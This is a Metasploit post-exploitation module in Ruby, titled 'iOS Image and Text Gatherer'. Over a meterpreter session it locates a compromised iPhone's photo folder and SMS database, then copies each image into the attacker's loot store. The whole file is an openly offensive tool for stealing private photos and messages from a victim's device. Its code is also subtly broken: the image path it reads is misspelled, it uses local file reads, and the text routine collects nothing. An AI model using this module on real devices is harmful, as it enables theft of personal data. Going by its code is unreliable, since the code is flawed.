##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'          =>  'iOS Image and Text Gatherer',
      'Description'   =>  %q{
        This module collects images and text messages from iPhones.
      },
      'License'       =>  MSF_LICENSE,
      'Author'        =>  [ 'Shelby Pace' ], # Metasploit Module
      'Platform'      =>  [ 'apple_ios' ],
      'SessionTypes'  =>  [ 'meterpreter' ]
    ))
  end

  # location of images: /private/var/mobile/Media/DCIM/100APPLE
  def check_for_img_path
    directory?('/private/var/mobile/Media/DCIM/100APPLE')
  end

  def enum_img
    img_path = '/private/var/mobile/Media/DCIM/100APPlE'
    unless check_for_img_path
      print_bad('Default image path not found')
      return
    end

    print_good('Image path found. Will begin searching for images...')
    ios_imgs = dir(img_path)
    ios_imgs.each do |img|
      begin
        f = File.open("#{img_path}/#{img}")
        data = File.read(f)
        store_loot("ios_image", "image/jpg", session, data, img)
        print_good("Stored #{img}")
      rescue
        print_bad('Failed to read and collect images')
      end
    end
  end

  # location of texts: /private/var/mobile/Library/SMS/sms.db
  def check_for_sms
    file?('/private/var/mobile/Library/SMS/sms.db')
  end

  def enum_text
    unless check_for_sms
      print_bad('No text messages found')
      return
    end

    print_good('Text message file found')
  end

  def run
    enum_img
    enum_text
  end
end
